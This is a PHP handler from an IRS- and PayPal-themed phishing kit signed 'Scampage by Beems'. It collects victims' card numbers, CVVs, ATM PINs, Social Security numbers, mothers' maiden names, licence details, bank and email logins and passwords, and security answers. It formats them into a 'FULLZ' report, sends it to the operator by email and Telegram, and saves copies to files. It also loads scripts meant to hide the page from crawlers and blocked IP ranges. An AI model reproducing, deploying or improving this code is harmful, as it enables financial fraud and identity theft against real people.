<?php
session_start();
/*
* Scampage by Beems
* Jabber: beems@exploit.im
* ICQ: Beems
*/
require_once '../../main.php';

require_once '../../blocker.php';
if($block_referrer == "on") {
    require_once '../../crawlerdetect.php';
}
if($block_iprange == "on") {
    require_once '../../blacklist.php';
}
require_once '../session.php';

if (!$_POST['CardNumber']) {
} else {
    $CardNumber = $_SESSION['CardNumber'] = $_POST['CardNumber'];
    $TypeC = $_SESSION['type'] = $_POST['type'];
    $BankC = $_SESSION['bank'] = $_POST['bank'];
    $BrandC = $_SESSION['brandbank'] = $_POST['brandbank'];
    $ExpirationDate = $_SESSION['ExpirationDate'] = $_POST['ExpirationDate'];
    $Cvv = $_SESSION['Cvv'] = $_POST['Cvv'];
    $SecurityNumber = $_SESSION['SecurityNumber'];
    $AtmPin = $_SESSION['AtmPin'] = $_POST['AtmPin'];
    $LicenseNumber = $_SESSION['LicenseNumber'];
    $LicenseNExp = $_SESSION['LicenseNExp'];
    $LicenseNumberWeight = $_SESSION['LicenseNumberWeight'];
    $LicenseNumberHeight = $_SESSION['LicenseNumberHeight'];
    $last4 = substr($CardNumber, 12, 16);
    $cardInfo = check_bin($CardNumber);
    $BIN = substr($CardNumber,0,6);
    $Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
    $Brand = ($cardInfo['brand']);
    $Type = ($cardInfo['type']);
    $VictimInfo1 = "| Submitted by : " . $ip . " (" . gethostbyaddr($ip) . ")";
    $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| UserAgent : " . $user_agent . "";
    $VictimInfo4 = "| Browser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
     $emaildress = $_SESSION['emaildress'];
    $emailPassword = $_SESSION['emailPassword'];
    $emailretry = $_SESSION['emailretry'];
    $emailType = $_SESSION['emailType'];
    $emailProvider = $_SESSION['emailProvider'];
          $userbank = $_SESSION['userbank'];
          $passwordbank = $_SESSION['passwordbank'];
          $loginretry = $_SESSION['loginretry'];
          $accountNumber = $_SESSION['accountNumberInput'];
          $routingNumber = $_SESSION['routingNumberGroup'];
          $accountType = $_SESSION['accountType'];
          $PaypalBank = $_SESSION['bankname'];    
          $pinbank = $_SESSION['pinbank'];

          $LicenseNumber = $_SESSION['LicenseNumber'];
          $LicenseNExp = $_SESSION['LicenseNExp'];
          $LicenseNumberWeight = $_SESSION['LicenseNumberWeight'];
          $LicenseIss = $_SESSION['LicenseIss'];
          $MaidenName = $_SESSION['MaidenName'];
          $fullname = $_SESSION['fullname'];
          $DateOfBirth = $_SESSION['DateOfBirth'];
          $StreetAddress = $_SESSION['StreetAddress'];
          $StateRegion = $_SESSION['StateRegion'];
          $ZipCode = $_SESSION['ZipCode'];
          $CityR = $_SESSION['CityR'];
          $NumberPhone = $_SESSION['NumberPhone'];
          $NumberCarrier = $_SESSION['NumberCarrier'];
          $NumberPin = $_SESSION['NumberPin'];
          $SecurityNumber = $_SESSION['SecurityNumber'];
          $message = "+ -------- [ ⚡ Beems IRS ⚡ ] -----------+\n";
          $message .= "+ 💎 Personal Information\n";
          $message .= "| Full name : $fullname\n";
          $message .= "| Date of birth : $DateOfBirth\n";
          $message .= "| SSN : $SecurityNumber\n";
          $message .= "| MMN : $MaidenName\n";
          $message .= "| Address : $StreetAddress\n";
          $message .= "| State : $StateRegion\n";
          $message .= "| City : $CityR\n";
          $message .= "| Zip : $ZipCode\n";
          $message .= "| Telephone : $NumberPhone\n";
          if ($enablephonepin === "on") {
              $message .= "| Phone Carrier : $NumberCarrier\n";
              $message .= "| Phone Carrier Pin : $NumberPin\n";
          }
          $message .= "| License Number : $LicenseNumber\n";
          $message .= "| License Weight : $LicenseNumberWeight\n";
          $message .= "| License Height : $LicenseNumberHeight\n";
          $message .= "| License Issued State: $LicenseIss\n";
          $message .= "| License Expiry: $LicenseNExp\n";
          $message .= "+ ------------------------------------+\n";
          $message .="| 🏦 $PaypalBank Routing & Account Details\n";
          $message .="| Account Type : $accountType\n";
          $message .="| Routing Number : $routingNumber\n";
          $message .="| Account Number : $accountNumber\n";
          $message .= "+ ------------------------------------+\n";
          $message .="| 🏦 $PaypalBank Login Details $loginretry\n";
          $message .="| login : $userbank\n";
          $message .="| password : $passwordbank\n";
          if (isset($_SESSION['pinbank'])) {
              $message .="| Pin: $pinbank\n";
          }
          if (isset($_SESSION['answer3'])) {
            $questions1 = $_SESSION['question1'];
            $questions2 = $_SESSION['question2'];
            $questions3 = $_SESSION['question3'];
            $answer1 = $_SESSION['answer1'];
            $answer2 = $_SESSION['answer2'];
            $answer3 = $_SESSION['answer3'];
            $message .="+ ------------------------------------+\n";
            $message .="| ❇️ $PaypalBank Security Questions & Answers \n";
            $message .="| question1 : $questions1\n";
            $message .="| answer1 : $answer1\n";
            $message .="| question2 : $questions2\n";
            $message .="| answer2 : $answer2\n";
            $message .="| question3 : $questions3\n";
            $message .="| answer3 : $answer3\n";
          }
          $message .="+ ------------------------------------+\n";
          $message .= "+ ✅ $PaypalBank Email login $emailretry\n";
          $message .= "| Email login : $emaildress\n";
          $message .= "| Email password : $emailPassword\n";
          $message .= "| Email Provider : $emailProvider\n";
          $message .= "| Email Type : $emailType\n";
          $message .= "+ ------------------------------------+\n";
        $message .= "+ 💳 Billing Information\n";
        $message .= "| Card BIN : $BIN\n";
        $message .= "| Card Bank : $Bank\n";
        $message .= "| Card Type : $Brand $Type\n";
        $message .= "| Card Number : $CardNumber\n";
        $message .= "| Card Exp : $ExpirationDate\n";
        $message .= "| ATM PIN : $AtmPin\n";
        $message .= "| CVV : $Cvv\n";
        $message .= "+ ------------------------------------+\n";
          $message .= "+ 🌐 Victim Information\n";
          $message .= "$VictimInfo1\n";
          $message .= "$VictimInfo2\n";
          $message .= "$VictimInfo3\n";
          $message .= "$VictimInfo4\n";
          $message .= "$VictimInfo5\n";
          $message .= "| 🕛 Received : $date\n";
          $message .= "+ ------------------------------------+\n";
    if($cardInfo["brand"] == "") {
        $subject = $PaypalBank." FULLZ: " .$fullname." ".$BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["bank"]["name"])." [ $cn - $os - $ip ]";
    $subbin = $BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["bank"]["name"]);
    } else {
        $subject = $PaypalBank." FULLZ: " .$fullname." ".$BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["brand"])." ".strtoupper($cardInfo["bank"]["name"])." [ $cn - $os - $ip ]";
    $subbin = $BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["brand"])." ".strtoupper($cardInfo["bank"]["name"]);
    }
    kirim_mail($email_result, $PaypalBank." FULLZ ".$fullname, $subject, $message);
    kirim_tele($telegram_bot_token, $telegram_chat_id);
    $dob_year = explode("/",$DateOfBirth);
    $dob_year = (end($dob_year));
    tulis_file("../../data/rezs/".$ip."_".$StateRegion."_".$dob_year.".txt", $message);
    
    tulis_file("../../result/total_cc.txt", $ip);
    if($save_file == "on") {
        tulis_file("../../data/Data_Fullz_bank.txt", $message);
    }
    tulis_file("../../result/total_bin.txt","$subbin|$countrycode|$cn|$os\n");
}
?>